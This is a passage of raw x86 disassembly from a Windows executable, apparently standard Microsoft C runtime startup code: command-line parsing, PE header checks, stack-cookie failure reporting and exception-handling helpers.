  4069d7:	59                   	pop    %ecx
  4069d8:	ff 15 54 a2 40 00    	call   *0x40a254
  4069de:	8b 0d 28 85 40 00    	mov    0x408528,%ecx
  4069e4:	89 08                	mov    %ecx,(%eax)
  4069e6:	ff 15 70 a2 40 00    	call   *0x40a270
  4069ec:	8b 0d 1c 85 40 00    	mov    0x40851c,%ecx
  4069f2:	89 08                	mov    %ecx,(%eax)
  4069f4:	e8 07 06 00 00       	call   0x407000
  4069f9:	83 3d 00 80 40 00 00 	cmpl   $0x0,0x408000
  406a00:	75 0c                	jne    0x406a0e
  406a02:	68 00 70 40 00       	push   $0x407000
  406a07:	ff 15 44 a2 40 00    	call   *0x40a244
  406a0d:	59                   	pop    %ecx
  406a0e:	e8 dc 07 00 00       	call   0x4071ef
  406a13:	33 c0                	xor    %eax,%eax
  406a15:	c3                   	ret
  406a16:	cc                   	int3
  406a17:	cc                   	int3
  406a18:	cc                   	int3
  406a19:	cc                   	int3
  406a1a:	cc                   	int3
  406a1b:	cc                   	int3
  406a1c:	cc                   	int3
  406a1d:	cc                   	int3
  406a1e:	cc                   	int3
  406a1f:	cc                   	int3
  406a20:	a1 24 85 40 00       	mov    0x408524,%eax
  406a25:	68 fc 81 40 00       	push   $0x4081fc
  406a2a:	ff 35 20 85 40 00    	push   0x408520
  406a30:	a3 fc 81 40 00       	mov    %eax,0x4081fc
  406a35:	68 f0 81 40 00       	push   $0x4081f0
  406a3a:	68 ec 81 40 00       	push   $0x4081ec
  406a3f:	68 e8 81 40 00       	push   $0x4081e8
  406a44:	ff 15 68 a2 40 00    	call   *0x40a268
  406a4a:	83 c4 14             	add    $0x14,%esp
  406a4d:	a3 f4 81 40 00       	mov    %eax,0x4081f4
  406a52:	c3                   	ret
  406a53:	cc                   	int3
  406a54:	cc                   	int3
  406a55:	cc                   	int3
  406a56:	cc                   	int3
  406a57:	cc                   	int3
  406a58:	cc                   	int3
  406a59:	cc                   	int3
  406a5a:	cc                   	int3
  406a5b:	cc                   	int3
  406a5c:	cc                   	int3
  406a5d:	cc                   	int3
  406a5e:	cc                   	int3
  406a5f:	cc                   	int3
  406a60:	e8 f0 06 00 00       	call   0x407155
  406a65:	e9 00 00 00 00       	jmp    0x406a6a
  406a6a:	6a 58                	push   $0x58
  406a6c:	68 b8 72 40 00       	push   $0x4072b8
  406a71:	e8 92 07 00 00       	call   0x407208
  406a76:	33 db                	xor    %ebx,%ebx
  406a78:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  406a7b:	8d 45 98             	lea    -0x68(%ebp),%eax
  406a7e:	50                   	push   %eax
  406a7f:	ff 15 84 a1 40 00    	call   *0x40a184
  406a85:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  406a88:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
  406a8e:	8b 70 04             	mov    0x4(%eax),%esi
  406a91:	8b fb                	mov    %ebx,%edi
  406a93:	ba ac 88 40 00       	mov    $0x4088ac,%edx
  406a98:	8b ce                	mov    %esi,%ecx
  406a9a:	33 c0                	xor    %eax,%eax
  406a9c:	f0 0f b1 0a          	lock cmpxchg %ecx,(%edx)
  406aa0:	85 c0                	test   %eax,%eax
  406aa2:	74 18                	je     0x406abc
  406aa4:	3b c6                	cmp    %esi,%eax
  406aa6:	75 07                	jne    0x406aaf
  406aa8:	33 f6                	xor    %esi,%esi
  406aaa:	46                   	inc    %esi
  406aab:	8b fe                	mov    %esi,%edi
  406aad:	eb 10                	jmp    0x406abf
  406aaf:	68 e8 03 00 00       	push   $0x3e8
  406ab4:	ff 15 88 a1 40 00    	call   *0x40a188
  406aba:	eb d7                	jmp    0x406a93
  406abc:	33 f6                	xor    %esi,%esi
  406abe:	46                   	inc    %esi
  406abf:	39 35 b0 88 40 00    	cmp    %esi,0x4088b0
  406ac5:	75 0a                	jne    0x406ad1
  406ac7:	6a 1f                	push   $0x1f
  406ac9:	e8 26 05 00 00       	call   0x406ff4
  406ace:	59                   	pop    %ecx
  406acf:	eb 3a                	jmp    0x406b0b
  406ad1:	39 1d b0 88 40 00    	cmp    %ebx,0x4088b0
  406ad7:	75 2c                	jne    0x406b05
  406ad9:	89 35 b0 88 40 00    	mov    %esi,0x4088b0
  406adf:	68 c4 10 40 00       	push   $0x4010c4
  406ae4:	68 b8 10 40 00       	push   $0x4010b8
  406ae9:	e8 51 01 00 00       	call   0x406c3f
  406aee:	59                   	pop    %ecx
  406aef:	59                   	pop    %ecx
  406af0:	85 c0                	test   %eax,%eax
  406af2:	74 17                	je     0x406b0b
  406af4:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406afb:	b8 ff 00 00 00       	mov    $0xff,%eax
  406b00:	e9 34 01 00 00       	jmp    0x406c39
  406b05:	89 35 e4 81 40 00    	mov    %esi,0x4081e4
  406b0b:	39 35 b0 88 40 00    	cmp    %esi,0x4088b0
  406b11:	75 1b                	jne    0x406b2e
  406b13:	68 b4 10 40 00       	push   $0x4010b4
  406b18:	68 ac 10 40 00       	push   $0x4010ac
  406b1d:	e8 e0 06 00 00       	call   0x407202
  406b22:	59                   	pop    %ecx
  406b23:	59                   	pop    %ecx
  406b24:	c7 05 b0 88 40 00 02 	movl   $0x2,0x4088b0
  406b2b:	00 00 00 
  406b2e:	85 ff                	test   %edi,%edi
  406b30:	75 09                	jne    0x406b3b
  406b32:	33 c0                	xor    %eax,%eax
  406b34:	b9 ac 88 40 00       	mov    $0x4088ac,%ecx
  406b39:	87 01                	xchg   %eax,(%ecx)
  406b3b:	83 3d b4 88 40 00 00 	cmpl   $0x0,0x4088b4
  406b42:	74 23                	je     0x406b67
  406b44:	68 b4 88 40 00       	push   $0x4088b4
  406b49:	e8 12 05 00 00       	call   0x407060
  406b4e:	59                   	pop    %ecx
  406b4f:	85 c0                	test   %eax,%eax
  406b51:	74 14                	je     0x406b67
  406b53:	53                   	push   %ebx
  406b54:	6a 02                	push   $0x2
  406b56:	53                   	push   %ebx
  406b57:	8b 35 b4 88 40 00    	mov    0x4088b4,%esi
  406b5d:	8b ce                	mov    %esi,%ecx
  406b5f:	ff 15 88 a2 40 00    	call   *0x40a288
  406b65:	ff d6                	call   *%esi
  406b67:	a1 3c a2 40 00       	mov    0x40a23c,%eax
  406b6c:	8b 30                	mov    (%eax),%esi
  406b6e:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  406b71:	8b 7d e0             	mov    -0x20(%ebp),%edi
  406b74:	8a 0e                	mov    (%esi),%cl
  406b76:	80 f9 20             	cmp    $0x20,%cl
  406b79:	77 4a                	ja     0x406bc5
  406b7b:	84 c9                	test   %cl,%cl
  406b7d:	74 15                	je     0x406b94
  406b7f:	85 ff                	test   %edi,%edi
  406b81:	75 42                	jne    0x406bc5
  406b83:	84 c9                	test   %cl,%cl
  406b85:	74 0d                	je     0x406b94
  406b87:	80 f9 20             	cmp    $0x20,%cl
  406b8a:	77 08                	ja     0x406b94
  406b8c:	46                   	inc    %esi
  406b8d:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  406b90:	8a 0e                	mov    (%esi),%cl
  406b92:	eb ef                	jmp    0x406b83
  406b94:	f6 45 c4 01          	testb  $0x1,-0x3c(%ebp)
  406b98:	74 06                	je     0x406ba0
  406b9a:	0f b7 45 c8          	movzwl -0x38(%ebp),%eax
  406b9e:	eb 03                	jmp    0x406ba3
  406ba0:	6a 0a                	push   $0xa
  406ba2:	58                   	pop    %eax
  406ba3:	50                   	push   %eax
  406ba4:	56                   	push   %esi
  406ba5:	53                   	push   %ebx
  406ba6:	68 00 00 40 00       	push   $0x400000
  406bab:	e8 4b c0 ff ff       	call   0x402bfb
  406bb0:	a3 e0 81 40 00       	mov    %eax,0x4081e0
  406bb5:	83 3d f8 81 40 00 00 	cmpl   $0x0,0x4081f8
  406bbc:	75 60                	jne    0x406c1e
  406bbe:	50                   	push   %eax
  406bbf:	ff 15 60 a2 40 00    	call   *0x40a260
  406bc5:	80 f9 22             	cmp    $0x22,%cl
  406bc8:	75 0c                	jne    0x406bd6
  406bca:	33 c0                	xor    %eax,%eax
  406bcc:	85 ff                	test   %edi,%edi
  406bce:	0f 94 c0             	sete   %al
  406bd1:	8b f8                	mov    %eax,%edi
  406bd3:	89 7d e0             	mov    %edi,-0x20(%ebp)
  406bd6:	0f b6 c1             	movzbl %cl,%eax
  406bd9:	50                   	push   %eax
  406bda:	ff 15 50 a2 40 00    	call   *0x40a250
  406be0:	59                   	pop    %ecx
  406be1:	85 c0                	test   %eax,%eax
  406be3:	74 04                	je     0x406be9
  406be5:	46                   	inc    %esi
  406be6:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  406be9:	46                   	inc    %esi
  406bea:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  406bed:	eb 85                	jmp    0x406b74
  406bef:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  406bf2:	8b 01                	mov    (%ecx),%eax
  406bf4:	8b 00                	mov    (%eax),%eax
  406bf6:	89 45 dc             	mov    %eax,-0x24(%ebp)
  406bf9:	51                   	push   %ecx
  406bfa:	50                   	push   %eax
  406bfb:	e8 4e 03 00 00       	call   0x406f4e
  406c00:	59                   	pop    %ecx
  406c01:	59                   	pop    %ecx
  406c02:	c3                   	ret
  406c03:	8b 65 e8             	mov    -0x18(%ebp),%esp
  406c06:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406c09:	a3 e0 81 40 00       	mov    %eax,0x4081e0
  406c0e:	83 3d f8 81 40 00 00 	cmpl   $0x0,0x4081f8
  406c15:	75 07                	jne    0x406c1e
  406c17:	50                   	push   %eax
  406c18:	ff 15 5c a2 40 00    	call   *0x40a25c
  406c1e:	83 3d e4 81 40 00 00 	cmpl   $0x0,0x4081e4
  406c25:	75 0b                	jne    0x406c32
  406c27:	ff 15 58 a2 40 00    	call   *0x40a258
  406c2d:	a1 e0 81 40 00       	mov    0x4081e0,%eax
  406c32:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406c39:	e8 0f 06 00 00       	call   0x40724d
  406c3e:	c3                   	ret
  406c3f:	8b ff                	mov    %edi,%edi
  406c41:	55                   	push   %ebp
  406c42:	8b ec                	mov    %esp,%ebp
  406c44:	56                   	push   %esi
  406c45:	8b 75 08             	mov    0x8(%ebp),%esi
  406c48:	33 c0                	xor    %eax,%eax
  406c4a:	3b 75 0c             	cmp    0xc(%ebp),%esi
  406c4d:	73 1e                	jae    0x406c6d
  406c4f:	57                   	push   %edi
  406c50:	85 c0                	test   %eax,%eax
  406c52:	75 18                	jne    0x406c6c
  406c54:	8b 3e                	mov    (%esi),%edi
  406c56:	85 ff                	test   %edi,%edi
  406c58:	74 0a                	je     0x406c64
  406c5a:	8b cf                	mov    %edi,%ecx
  406c5c:	ff 15 88 a2 40 00    	call   *0x40a288
  406c62:	ff d7                	call   *%edi
  406c64:	83 c6 04             	add    $0x4,%esi
  406c67:	3b 75 0c             	cmp    0xc(%ebp),%esi
  406c6a:	72 e4                	jb     0x406c50
  406c6c:	5f                   	pop    %edi
  406c6d:	5e                   	pop    %esi
  406c6e:	5d                   	pop    %ebp
  406c6f:	c3                   	ret
  406c70:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  406c75:	66 39 05 00 00 40 00 	cmp    %ax,0x400000
  406c7c:	75 55                	jne    0x406cd3
  406c7e:	8b 0d 3c 00 40 00    	mov    0x40003c,%ecx
  406c84:	81 b9 00 00 40 00 50 	cmpl   $0x4550,0x400000(%ecx)
  406c8b:	45 00 00 
  406c8e:	75 43                	jne    0x406cd3
  406c90:	0f b7 81 18 00 40 00 	movzwl 0x400018(%ecx),%eax
  406c97:	ba 0b 01 00 00       	mov    $0x10b,%edx
  406c9c:	66 3b c2             	cmp    %dx,%ax
  406c9f:	74 1f                	je     0x406cc0
  406ca1:	ba 0b 02 00 00       	mov    $0x20b,%edx
  406ca6:	66 3b c2             	cmp    %dx,%ax
  406ca9:	75 28                	jne    0x406cd3
  406cab:	83 b9 84 00 40 00 0e 	cmpl   $0xe,0x400084(%ecx)
  406cb2:	76 1f                	jbe    0x406cd3
  406cb4:	33 c0                	xor    %eax,%eax
  406cb6:	39 81 f8 00 40 00    	cmp    %eax,0x4000f8(%ecx)
  406cbc:	0f 95 c0             	setne  %al
  406cbf:	c3                   	ret
  406cc0:	83 b9 74 00 40 00 0e 	cmpl   $0xe,0x400074(%ecx)
  406cc7:	76 0a                	jbe    0x406cd3
  406cc9:	33 c0                	xor    %eax,%eax
  406ccb:	39 81 e8 00 40 00    	cmp    %eax,0x4000e8(%ecx)
  406cd1:	eb e9                	jmp    0x406cbc
  406cd3:	33 c0                	xor    %eax,%eax
  406cd5:	c3                   	ret
  406cd6:	cc                   	int3
  406cd7:	cc                   	int3
  406cd8:	cc                   	int3
  406cd9:	cc                   	int3
  406cda:	cc                   	int3
  406cdb:	cc                   	int3
  406cdc:	cc                   	int3
  406cdd:	cc                   	int3
  406cde:	cc                   	int3
  406cdf:	cc                   	int3
  406ce0:	3b 0d 04 80 40 00    	cmp    0x408004,%ecx
  406ce6:	75 03                	jne    0x406ceb
  406ce8:	c2 00 00             	ret    $0x0
  406ceb:	e9 2a 00 00 00       	jmp    0x406d1a
  406cf0:	8b ff                	mov    %edi,%edi
  406cf2:	55                   	push   %ebp
  406cf3:	8b ec                	mov    %esp,%ebp
  406cf5:	6a 00                	push   $0x0
  406cf7:	ff 15 7c a1 40 00    	call   *0x40a17c
  406cfd:	ff 75 08             	push   0x8(%ebp)
  406d00:	ff 15 80 a1 40 00    	call   *0x40a180
  406d06:	68 09 04 00 c0       	push   $0xc0000409
  406d0b:	ff 15 90 a1 40 00    	call   *0x40a190
  406d11:	50                   	push   %eax
  406d12:	ff 15 78 a1 40 00    	call   *0x40a178
  406d18:	5d                   	pop    %ebp
  406d19:	c3                   	ret
  406d1a:	8b ff                	mov    %edi,%edi
  406d1c:	55                   	push   %ebp
  406d1d:	8b ec                	mov    %esp,%ebp
  406d1f:	81 ec 24 03 00 00    	sub    $0x324,%esp
  406d25:	a3 00 83 40 00       	mov    %eax,0x408300
  406d2a:	89 0d fc 82 40 00    	mov    %ecx,0x4082fc
  406d30:	89 15 f8 82 40 00    	mov    %edx,0x4082f8
  406d36:	89 1d f4 82 40 00    	mov    %ebx,0x4082f4
  406d3c:	89 35 f0 82 40 00    	mov    %esi,0x4082f0
  406d42:	89 3d ec 82 40 00    	mov    %edi,0x4082ec
  406d48:	66 8c 15 18 83 40 00 	data16 mov %ss,0x408318
  406d4f:	66 8c 0d 0c 83 40 00 	data16 mov %cs,0x40830c
  406d56:	66 8c 1d e8 82 40 00 	data16 mov %ds,0x4082e8
  406d5d:	66 8c 05 e4 82 40 00 	data16 mov %es,0x4082e4
  406d64:	66 8c 25 e0 82 40 00 	data16 mov %fs,0x4082e0
  406d6b:	66 8c 2d dc 82 40 00 	data16 mov %gs,0x4082dc
  406d72:	9c                   	pushf
  406d73:	8f 05 10 83 40 00    	pop    0x408310
  406d79:	8b 45 00             	mov    0x0(%ebp),%eax
  406d7c:	a3 04 83 40 00       	mov    %eax,0x408304
  406d81:	8b 45 04             	mov    0x4(%ebp),%eax
  406d84:	a3 08 83 40 00       	mov    %eax,0x408308
  406d89:	8d 45 08             	lea    0x8(%ebp),%eax
  406d8c:	a3 14 83 40 00       	mov    %eax,0x408314
  406d91:	8b 85 dc fc ff ff    	mov    -0x324(%ebp),%eax
  406d97:	c7 05 50 82 40 00 01 	movl   $0x10001,0x408250
  406d9e:	00 01 00 
  406da1:	a1 08 83 40 00       	mov    0x408308,%eax
  406da6:	a3 0c 82 40 00       	mov    %eax,0x40820c
  406dab:	c7 05 00 82 40 00 09 	movl   $0xc0000409,0x408200
  406db2:	04 00 c0 
  406db5:	c7 05 04 82 40 00 01 	movl   $0x1,0x408204
  406dbc:	00 00 00 
  406dbf:	c7 05 10 82 40 00 03 	movl   $0x3,0x408210
  406dc6:	00 00 00 
  406dc9:	6a 04                	push   $0x4
  406dcb:	58                   	pop    %eax
  406dcc:	6b c0 00             	imul   $0x0,%eax,%eax
  406dcf:	c7 80 14 82 40 00 02 	movl   $0x2,0x408214(%eax)
  406dd6:	00 00 00 
  406dd9:	6a 04                	push   $0x4
  406ddb:	58                   	pop    %eax
  406ddc:	c1 e0 00             	shl    $0x0,%eax
  406ddf:	8b 0d 04 80 40 00    	mov    0x408004,%ecx
  406de5:	89 88 14 82 40 00    	mov    %ecx,0x408214(%eax)
  406deb:	6a 04                	push   $0x4
  406ded:	58                   	pop    %eax
  406dee:	d1 e0                	shl    $1,%eax
  406df0:	8b 0d 08 80 40 00    	mov    0x408008,%ecx
  406df6:	89 88 14 82 40 00    	mov    %ecx,0x408214(%eax)
  406dfc:	6a 04                	push   $0x4
  406dfe:	58                   	pop    %eax
  406dff:	6b c0 00             	imul   $0x0,%eax,%eax
  406e02:	8b 0d 04 80 40 00    	mov    0x408004,%ecx
  406e08:	89 4c 05 f8          	mov    %ecx,-0x8(%ebp,%eax,1)
  406e0c:	6a 04                	push   $0x4
  406e0e:	58                   	pop    %eax
  406e0f:	c1 e0 00             	shl    $0x0,%eax
  406e12:	8b 0d 08 80 40 00    	mov    0x408008,%ecx
  406e18:	89 4c 05 f8          	mov    %ecx,-0x8(%ebp,%eax,1)
  406e1c:	68 00 10 40 00       	push   $0x401000
  406e21:	e8 ca fe ff ff       	call   0x406cf0
  406e26:	8b e5                	mov    %ebp,%esp
  406e28:	5d                   	pop    %ebp
  406e29:	c3                   	ret
  406e2a:	8b ff                	mov    %edi,%edi
  406e2c:	55                   	push   %ebp
  406e2d:	8b ec                	mov    %esp,%ebp
  406e2f:	a3 00 83 40 00       	mov    %eax,0x408300
  406e34:	89 0d fc 82 40 00    	mov    %ecx,0x4082fc
  406e3a:	89 15 f8 82 40 00    	mov    %edx,0x4082f8
  406e40:	89 1d f4 82 40 00    	mov    %ebx,0x4082f4
  406e46:	89 35 f0 82 40 00    	mov    %esi,0x4082f0
  406e4c:	89 3d ec 82 40 00    	mov    %edi,0x4082ec
  406e52:	66 8c 15 18 83 40 00 	data16 mov %ss,0x408318
  406e59:	66 8c 0d 0c 83 40 00 	data16 mov %cs,0x40830c
  406e60:	66 8c 1d e8 82 40 00 	data16 mov %ds,0x4082e8
  406e67:	66 8c 05 e4 82 40 00 	data16 mov %es,0x4082e4
  406e6e:	66 8c 25 e0 82 40 00 	data16 mov %fs,0x4082e0
  406e75:	66 8c 2d dc 82 40 00 	data16 mov %gs,0x4082dc
  406e7c:	9c                   	pushf
  406e7d:	8f 05 10 83 40 00    	pop    0x408310
  406e83:	c7 05 50 82 40 00 01 	movl   $0x10001,0x408250
  406e8a:	00 01 00 
  406e8d:	8b 45 04             	mov    0x4(%ebp),%eax
  406e90:	a3 08 83 40 00       	mov    %eax,0x408308
  406e95:	8d 45 04             	lea    0x4(%ebp),%eax
  406e98:	83 c0 04             	add    $0x4,%eax
  406e9b:	a3 14 83 40 00       	mov    %eax,0x408314
  406ea0:	a1 08 83 40 00       	mov    0x408308,%eax
  406ea5:	a3 0c 82 40 00       	mov    %eax,0x40820c
  406eaa:	c7 05 00 82 40 00 09 	movl   $0xc0000409,0x408200
  406eb1:	04 00 c0 
  406eb4:	c7 05 04 82 40 00 01 	movl   $0x1,0x408204
  406ebb:	00 00 00 
  406ebe:	c7 05 10 82 40 00 01 	movl   $0x1,0x408210
  406ec5:	00 00 00 
  406ec8:	6a 04                	push   $0x4
  406eca:	58                   	pop    %eax
  406ecb:	6b c0 00             	imul   $0x0,%eax,%eax
  406ece:	c7 80 14 82 40 00 08 	movl   $0x8,0x408214(%eax)
  406ed5:	00 00 00 
  406ed8:	68 00 10 40 00       	push   $0x401000
  406edd:	e8 0e fe ff ff       	call   0x406cf0
  406ee2:	5d                   	pop    %ebp
  406ee3:	c3                   	ret
  406ee4:	cc                   	int3
  406ee5:	cc                   	int3
  406ee6:	cc                   	int3
  406ee7:	cc                   	int3
  406ee8:	cc                   	int3
  406ee9:	cc                   	int3
  406eea:	cc                   	int3
  406eeb:	cc                   	int3
  406eec:	cc                   	int3
  406eed:	cc                   	int3
  406eee:	cc                   	int3
  406eef:	cc                   	int3
  406ef0:	8b ff                	mov    %edi,%edi
  406ef2:	55                   	push   %ebp
  406ef3:	8b ec                	mov    %esp,%ebp
  406ef5:	8b 45 08             	mov    0x8(%ebp),%eax
  406ef8:	8b 00                	mov    (%eax),%eax
  406efa:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  406f00:	75 2b                	jne    0x406f2d
  406f02:	83 78 10 03          	cmpl   $0x3,0x10(%eax)
  406f06:	75 25                	jne    0x406f2d
  406f08:	8b 40 14             	mov    0x14(%eax),%eax
  406f0b:	3d 20 05 93 19       	cmp    $0x19930520,%eax
  406f10:	74 15                	je     0x406f27
  406f12:	3d 21 05 93 19       	cmp    $0x19930521,%eax
  406f17:	74 0e                	je     0x406f27
  406f19:	3d 22 05 93 19       	cmp    $0x19930522,%eax
  406f1e:	74 07                	je     0x406f27
  406f20:	3d 00 40 99 01       	cmp    $0x1994000,%eax
  406f25:	75 06                	jne    0x406f2d
  406f27:	ff 15 38 a2 40 00    	call   *0x40a238
  406f2d:	33 c0                	xor    %eax,%eax
  406f2f:	5d                   	pop    %ebp
  406f30:	c2 04 00             	ret    $0x4
  406f33:	cc                   	int3
  406f34:	cc                   	int3
  406f35:	cc                   	int3
  406f36:	cc                   	int3
  406f37:	cc                   	int3
  406f38:	cc                   	int3
  406f39:	cc                   	int3
  406f3a:	cc                   	int3
  406f3b:	cc                   	int3
  406f3c:	cc                   	int3
  406f3d:	cc                   	int3
  406f3e:	cc                   	int3
  406f3f:	cc                   	int3
  406f40:	68 f0 6e 40 00       	push   $0x406ef0
  406f45:	ff 15 7c a1 40 00    	call   *0x40a17c
  406f4b:	33 c0                	xor    %eax,%eax
  406f4d:	c3                   	ret
  406f4e:	ff 25 74 a2 40 00    	jmp    *0x40a274
  406f54:	6a 0c                	push   $0xc
  406f56:	68 d8 72 40 00       	push   $0x4072d8
  406f5b:	e8 a8 02 00 00       	call   0x407208
  406f60:	33 c9                	xor    %ecx,%ecx
  406f62:	8b 45 08             	mov    0x8(%ebp),%eax
  406f65:	85 c0                	test   %eax,%eax
  406f67:	74 4b                	je     0x406fb4
  406f69:	83 f8 ff             	cmp    $0xffffffff,%eax
  406f6c:	74 46                	je     0x406fb4
  406f6e:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  406f71:	ba 4d 5a 00 00       	mov    $0x5a4d,%edx
  406f76:	66 39 10             	cmp    %dx,(%eax)
  406f79:	75 32                	jne    0x406fad
  406f7b:	8b 50 3c             	mov    0x3c(%eax),%edx
  406f7e:	85 d2                	test   %edx,%edx
  406f80:	78 2b                	js     0x406fad
  406f82:	81 fa 00 00 00 10    	cmp    $0x10000000,%edx
  406f88:	73 23                	jae    0x406fad
  406f8a:	03 c2                	add    %edx,%eax
  406f8c:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  406f8f:	8b 08                	mov    (%eax),%ecx
  406f91:	81 e9 50 45 00 00    	sub    $0x4550,%ecx
  406f97:	f7 d9                	neg    %ecx
  406f99:	1b c9                	sbb    %ecx,%ecx
  406f9b:	f7 d1                	not    %ecx
  406f9d:	23 c8                	and    %eax,%ecx
  406f9f:	eb 09                	jmp    0x406faa
  406fa1:	33 c0                	xor    %eax,%eax
  406fa3:	40                   	inc    %eax
  406fa4:	c3                   	ret
  406fa5:	8b 65 e8             	mov    -0x18(%ebp),%esp
  406fa8:	33 c9                	xor    %ecx,%ecx
  406faa:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  406fad:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406fb4:	8b c1                	mov    %ecx,%eax
  406fb6:	e8 92 02 00 00       	call   0x40724d
  406fbb:	c2 04 00             	ret    $0x4
  406fbe:	8b ff                	mov    %edi,%edi
  406fc0:	55                   	push   %ebp
  406fc1:	8b ec                	mov    %esp,%ebp
  406fc3:	6a 00                	push   $0x0
  406fc5:	ff 15 30 a1 40 00    	call   *0x40a130
  406fcb:	85 c0                	test   %eax,%eax
  406fcd:	74 20                	je     0x406fef
  406fcf:	50                   	push   %eax
  406fd0:	e8 7f ff ff ff       	call   0x406f54
  406fd5:	85 c0                	test   %eax,%eax
  406fd7:	74 16                	je     0x406fef
  406fd9:	0f b7 48 5c          	movzwl 0x5c(%eax),%ecx
  406fdd:	6a 02                	push   $0x2
  406fdf:	58                   	pop    %eax
  406fe0:	66 3b c8             	cmp    %ax,%cx
  406fe3:	74 0d                	je     0x406ff2
  406fe5:	83 f9 03             	cmp    $0x3,%ecx
  406fe8:	75 05                	jne    0x406fef
  406fea:	33 c0                	xor    %eax,%eax
  406fec:	40                   	inc    %eax
  406fed:	5d                   	pop    %ebp
  406fee:	c3                   	ret
  406fef:	8b 45 08             	mov    0x8(%ebp),%eax
  406ff2:	5d                   	pop    %ebp
  406ff3:	c3                   	ret
  406ff4:	ff 25 6c a2 40 00    	jmp    *0x40a26c
  406ffa:	cc                   	int3
  406ffb:	cc                   	int3
  406ffc:	cc                   	int3
  406ffd:	cc                   	int3
  406ffe:	cc                   	int3
  406fff:	cc                   	int3
  407000:	33 c0                	xor    %eax,%eax
  407002:	c3                   	ret
  407003:	cc                   	int3
  407004:	cc                   	int3
  407005:	cc                   	int3
  407006:	cc                   	int3
  407007:	cc                   	int3
  407008:	cc                   	int3
  407009:	cc                   	int3
  40700a:	cc                   	int3
  40700b:	cc                   	int3
  40700c:	cc                   	int3
  40700d:	cc                   	int3
  40700e:	cc                   	int3
  40700f:	cc                   	int3
  407010:	8b ff                	mov    %edi,%edi
  407012:	55                   	push   %ebp
  407013:	8b ec                	mov    %esp,%ebp
  407015:	8b 45 08             	mov    0x8(%ebp),%eax
  407018:	33 d2                	xor    %edx,%edx
  40701a:	53                   	push   %ebx
  40701b:	56                   	push   %esi
  40701c:	57                   	push   %edi
  40701d:	8b 48 3c             	mov    0x3c(%eax),%ecx
  407020:	03 c8                	add    %eax,%ecx
  407022:	0f b7 41 14          	movzwl 0x14(%ecx),%eax
  407026:	0f b7 59 06          	movzwl 0x6(%ecx),%ebx
  40702a:	83 c0 18             	add    $0x18,%eax
  40702d:	03 c1                	add    %ecx,%eax
  40702f:	85 db                	test   %ebx,%ebx
  407031:	74 1b                	je     0x40704e
  407033:	8b 7d 0c             	mov    0xc(%ebp),%edi
  407036:	8b 70 0c             	mov    0xc(%eax),%esi
  407039:	3b fe                	cmp    %esi,%edi
  40703b:	72 09                	jb     0x407046
  40703d:	8b 48 08             	mov    0x8(%eax),%ecx
  407040:	03 ce                	add    %esi,%ecx
  407042:	3b f9                	cmp    %ecx,%edi
  407044:	72 0a                	jb     0x407050
  407046:	42                   	inc    %edx
  407047:	83 c0 28             	add    $0x28,%eax
  40704a:	3b d3                	cmp    %ebx,%edx
  40704c:	72 e8                	jb     0x407036
  40704e:	33 c0                	xor    %eax,%eax
  407050:	5f                   	pop    %edi
  407051:	5e                   	pop    %esi
  407052:	5b                   	pop    %ebx
  407053:	5d                   	pop    %ebp
  407054:	c3                   	ret
  407055:	cc                   	int3
  407056:	cc                   	int3
  407057:	cc                   	int3
  407058:	cc                   	int3
  407059:	cc                   	int3
  40705a:	cc                   	int3
  40705b:	cc                   	int3
  40705c:	cc                   	int3
  40705d:	cc                   	int3
  40705e:	cc                   	int3
  40705f:	cc                   	int3
  407060:	8b ff                	mov    %edi,%edi
  407062:	55                   	push   %ebp
  407063:	8b ec                	mov    %esp,%ebp
  407065:	6a fe                	push   $0xfffffffe
  407067:	68 f8 72 40 00       	push   $0x4072f8
  40706c:	68 70 72 40 00       	push   $0x407270
  407071:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  407077:	50                   	push   %eax
  407078:	83 ec 08             	sub    $0x8,%esp
  40707b:	53                   	push   %ebx
  40707c:	56                   	push   %esi
  40707d:	57                   	push   %edi
  40707e:	a1 04 80 40 00       	mov    0x408004,%eax
  407083:	31 45 f8             	xor    %eax,-0x8(%ebp)
  407086:	33 c5                	xor    %ebp,%eax
  407088:	50                   	push   %eax
  407089:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40708c:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  407092:	89 65 e8             	mov    %esp,-0x18(%ebp)
  407095:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40709c:	68 00 00 40 00       	push   $0x400000
  4070a1:	e8 7a 00 00 00       	call   0x407120
  4070a6:	83 c4 04             	add    $0x4,%esp
  4070a9:	85 c0                	test   %eax,%eax
  4070ab:	74 54                	je     0x407101
  4070ad:	8b 45 08             	mov    0x8(%ebp),%eax
  4070b0:	2d 00 00 40 00       	sub    $0x400000,%eax
  4070b5:	50                   	push   %eax
  4070b6:	68 00 00 40 00       	push   $0x400000
  4070bb:	e8 50 ff ff ff       	call   0x407010
  4070c0:	83 c4 08             	add    $0x8,%esp
  4070c3:	85 c0                	test   %eax,%eax
  4070c5:	74 3a                	je     0x407101
  4070c7:	8b 40 24             	mov    0x24(%eax),%eax
  4070ca:	c1 e8 1f             	shr    $0x1f,%eax
  4070cd:	f7 d0                	not    %eax
  4070cf:	83 e0 01             	and    $0x1,%eax
  4070d2:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4070d9:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4070dc:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4070e3:	59                   	pop    %ecx
  4070e4:	5f                   	pop    %edi
  4070e5:	5e                   	pop    %esi
  4070e6:	5b                   	pop    %ebx
  4070e7:	8b e5                	mov    %ebp,%esp
